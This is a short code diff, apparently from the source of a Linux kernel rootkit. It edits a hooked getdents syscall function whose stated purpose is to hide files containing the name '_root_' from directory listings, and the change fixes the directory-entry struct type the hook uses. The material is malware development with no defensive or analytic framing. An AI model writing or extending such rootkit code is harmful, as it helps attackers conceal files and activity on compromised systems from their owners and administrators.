@@ -121,7 +121,7 @@ asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *di
 	{
 
 	unsigned long off = 0;
-	struct linux_dirent64 __user *dir;	
+	struct linux_dirent __user *dir;	
 
 /* list directory  and hide files containing name _root_ */
 	for(off=0;off<ret;){
